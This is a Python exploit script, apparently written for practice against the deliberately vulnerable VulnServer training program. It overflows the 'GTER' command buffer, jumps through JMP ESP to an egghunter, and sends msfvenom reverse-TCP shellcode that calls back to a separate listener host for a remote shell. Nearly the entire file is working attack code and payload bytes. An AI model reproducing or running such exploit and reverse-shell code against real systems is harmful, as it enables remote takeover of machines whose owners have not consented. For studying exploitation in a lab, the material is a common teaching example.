#!/usr/bin/env python
"""
Description: Vanilla Buffer Overflow w/ egghunter via "GTER" in VulnServer
Author: Cody Winkler
Contact: @cwinfosec (twitter)
Date: 9/15/2019
Tested On: Windows XP SP2 EN

[+] Usage: python expoit.py <IP> <PORT> 

$ python exploit.py 127.0.0.1 21
"""

import socket                                                                                                        

# 0x625011AF | JMP ESP | essfunc.dll

jmp_esp = "\xAF\x11\x50\x62"

#nasm > add eax,9                                                                                                                                                                                                                         
#00000000  83C009            add eax,byte +0x9
#nasm > jmp eax
#00000000  FFE0              jmp eax                                                                                 

stage_1 = "\x83\xC0\x09\xFF\xE0"                                                                                 

# d3rpd3rp egghunter
# Length: 32 bytes

egg_hunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x64\x33\x72\x70\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.130 LPORT=443 EXITFUNC=thread -b "\x00" -e x86/shikata_ga_nai --platform windows --arch x86 -f C
# Payload size: 351 bytes                                                                                            

shellcode = ("\xbb\x31\x77\xa2\xc9\xdb\xd8\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x83\xea\xfc\x31\x5a\x0e\x03\x6b\x79\x40\x3c\x77\x6d\x06"
"\xbf\x87\x6e\x67\x49\x62\x5f\xa7\x2d\xe7\xf0\x17\x25\xa5\xfc"
"\xdc\x6b\x5d\x76\x90\xa3\x52\x3f\x1f\x92\x5d\xc0\x0c\xe6\xfc"
"\x42\x4f\x3b\xde\x7b\x80\x4e\x1f\xbb\xfd\xa3\x4d\x14\x89\x16"
"\x61\x11\xc7\xaa\x0a\x69\xc9\xaa\xef\x3a\xe8\x9b\xbe\x31\xb3"
"\x3b\x41\x95\xcf\x75\x59\xfa\xea\xcc\xd2\xc8\x81\xce\x32\x01"
"\x69\x7c\x7b\xad\x98\x7c\xbc\x0a\x43\x0b\xb4\x68\xfe\x0c\x03"
"\x12\x24\x98\x97\xb4\xaf\x3a\x73\x44\x63\xdc\xf0\x4a\xc8\xaa"
"\x5e\x4f\xcf\x7f\xd5\x6b\x44\x7e\x39\xfa\x1e\xa5\x9d\xa6\xc5"
"\xc4\x84\x02\xab\xf9\xd6\xec\x14\x5c\x9d\x01\x40\xed\xfc\x4d"
"\xa5\xdc\xfe\x8d\xa1\x57\x8d\xbf\x6e\xcc\x19\x8c\xe7\xca\xde"
"\xf3\xdd\xab\x70\x0a\xde\xcb\x59\xc9\x8a\x9b\xf1\xf8\xb2\x77"
"\x01\x04\x67\xd7\x51\xaa\xd8\x98\x01\x0a\x89\x70\x4b\x85\xf6"
"\x61\x74\x4f\x9f\x08\x8f\x18\xaa\xc7\x8e\x5a\xc2\xd5\x90\x5b"
"\xa8\x53\x76\x31\xde\x35\x21\xae\x47\x1c\xb9\x4f\x87\x8a\xc4"
"\x50\x03\x39\x39\x1e\xe4\x34\x29\xf7\x04\x03\x13\x5e\x1a\xb9"
"\x3b\x3c\x89\x26\xbb\x4b\xb2\xf0\xec\x1c\x04\x09\x78\xb1\x3f"
"\xa3\x9e\x48\xd9\x8c\x1a\x97\x1a\x12\xa3\x5a\x26\x30\xb3\xa2"
"\xa7\x7c\xe7\x7a\xfe\x2a\x51\x3d\xa8\x9c\x0b\x97\x07\x77\xdb"
"\x6e\x64\x48\x9d\x6e\xa1\x3e\x41\xde\x1c\x07\x7e\xef\xc8\x8f"
"\x07\x0d\x69\x6f\xd2\x95\x89\x92\xf6\xe3\x21\x0b\x93\x49\x2c"
"\xac\x4e\x8d\x49\x2f\x7a\x6e\xae\x2f\x0f\x6b\xea\xf7\xfc\x01"
"\x63\x92\x02\xb5\x84\xb7")                                                                                          

# Total Length: 173 bytes
buffer = "GTER /.:/" + egg_hunter
buffer += "A"*(147-len(egg_hunter)) 
buffer += jmp_esp
buffer += stage_1                   
buffer += "\x43"*11   

try:                             
    print "[+] Connecting to target"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.11.1.128", 9999))
    print s.recv(1024)
    print "[+] Sending stage 2 + shellcode"               
    s.send("RTIME d3rpd3rp" + shellcode)                                                                             
    print s.recv(1024)         
    s.close()                                                                                                        
except:                        
    print "[-] Something went wrong :("                                                                              

try:
    print "[+] Connecting to target"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.11.1.128", 9999))
    print s.recv(1024)
    print "[+] Sending stage 1 payload with length: %d" % len(buffer)                                                
    s.send(buffer)                      
    s.close()         
except:      
    print "[-] Something went wrong :("
